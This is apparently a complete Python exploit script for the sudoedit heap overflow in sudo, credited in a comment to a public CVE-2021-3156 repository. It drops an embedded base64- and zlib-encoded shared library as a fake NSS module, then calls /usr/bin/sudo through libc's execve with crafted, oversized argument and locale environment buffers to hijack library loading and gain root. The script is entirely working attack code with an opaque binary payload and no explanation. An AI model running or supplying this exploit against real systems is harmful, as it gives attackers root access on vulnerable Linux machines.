import zlib, base64, subprocess, sys, os
from ctypes import cdll, c_char_p, POINTER, c_int, c_void_p

libc = cdll.LoadLibrary("libc.so.6") # Used for much more precise execution wthin libc itself.

FUS_partial = [ b"\\" ] * 0x18 + [ b"X/X1234\\" ]
FUS = FUS_partial*30
FUS[-1] = FUS[-1][:-1]  # Get rid of \\ at the end, we don't want the pointer to overflow again

def create_libx(name):
	so_path = 'libnss_'+name+'.so.2'
	if os.path.isfile(so_path):
		return  # existed
	so_dir = 'libnss_' + name.split('/')[0]
	if not os.path.exists(so_dir):
		os.makedirs(so_dir)
	libx_b64 = 'eNqrd/VxY2JkZIABZgY7BhBPACrkwIAJHBgsGJigbJAydgbcwJARlWYQgFBMUH0boMLodAIazQGl\neWDGQM1jRbOPDY3PhcbnZsAPsjIjDP/zs2ZlRfCzGn7z2KGflJmnX5zBEBASn2UdMZOfFQDLghD3'
	with open(so_path, 'wb') as f:
		f.write(zlib.decompress(base64.b64decode(libx_b64)))
	# Credit: Worawit W. https://github.com/Worawit/CVE-2021-3156

def execve(filename, argv, envp):
	libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)
	
	cargv = (c_char_p * len(argv))(*argv)
	cenvp = (c_char_p * len(envp))(*envp)

	libc.execve(filename, cargv, cenvp)

create_libx("X/X1234")
argv = [ b"sudoedit", b"-A", b"-s", b"A"*(0xe0)+b"\\", None ]
env = [ b"Z"*(0x786) + b"\\" ] + FUS + [ b"LC_CTYPE=C.UTF-8@" + b'Z'* 0x20 + b";A=" ,
        b"LC_NUMERIC=C.UTF-8@" + b'Z'*0xd0,
        b"LC_TIME=C.UTF-8@" + b'Z'*0x20,
        b"LC_COLLATE=C.UTF-8@" + b'Z'*0x20,
        b"LC_IDENTIFICATION=C.UTF-8@" + b'Z'*0x70,
        b"TZ=:",
        None
      ] 
execve(b"/usr/bin/sudo", argv, env)